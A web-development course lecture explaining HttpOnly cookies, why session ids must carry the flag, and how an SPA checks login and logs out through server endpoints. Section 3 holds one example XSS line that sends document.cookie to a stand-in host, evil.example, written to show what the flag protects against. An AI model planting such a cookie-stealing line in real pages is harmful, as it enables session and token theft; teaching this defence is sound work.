# Lecture 24.07 · What JavaScript Can NOT See: `HttpOnly` Cookies

> **Section:** S24 · **Type:** 📖 Theory · **Track:** ★ Core · **Time:** ~20 minutes

---

## 1. The experiment

Start the mock API with `--secure`, log in as alice, then open the console:

```js
document.cookie
// "XSRF-TOKEN=9a1e…; tf_theme=dark"          ← no JSESSIONID
```

DevTools → Application → Cookies shows **`JSESSIONID`**, with a ✓ in the **HttpOnly** column. The Network tab shows it in the `Cookie` header of every `/api` request. Yet JavaScript can't read it, and neither can js-cookie.

## 2. What `HttpOnly` means exactly

| | `HttpOnly` cookie |
|---|---|
| sent by the browser on matching requests | ✅ yes, like any cookie |
| readable by `document.cookie` / js-cookie | ❌ no |
| writable or deletable by JavaScript | ❌ no (the server clears it with `Set-Cookie … Max-Age=0`) |
| visible in DevTools | ✅ yes (DevTools isn't page JavaScript) |

## 3. Why the session id must be one

The session id **is** the login. Whoever holds it is alice until it expires. If JavaScript could read it, then **any** script running on the page could send it anywhere: an XSS payload (S26), a compromised npm dependency, a malicious browser extension.

```js
new Image().src = 'https://evil.example/steal?c=' + encodeURIComponent(document.cookie);
```

With `HttpOnly`, that line leaks the theme and the CSRF token, but **not the session**. The attacker would have to act *inside* the victim's page, while it's open (24.08). They can't take the session home and use it for weeks.

## 4. Consequences for the SPA

- The SPA **can't know** whether it's logged in by looking at cookies. It asks the server: `GET /api/auth/me` (24.09).
- The SPA **can't log out** by deleting the cookie. It asks the server: `POST /api/auth/logout`, which ends the session and clears the cookie (24.12).
- The CSRF token is **deliberately not** `HttpOnly`, because JavaScript must read it (24.10). It isn't a credential on its own.

## ✅ Recap

`HttpOnly` = sent by the browser, invisible to scripts. Session ids **always** `HttpOnly`. The SPA learns "who am I?" from an endpoint, never from a cookie.
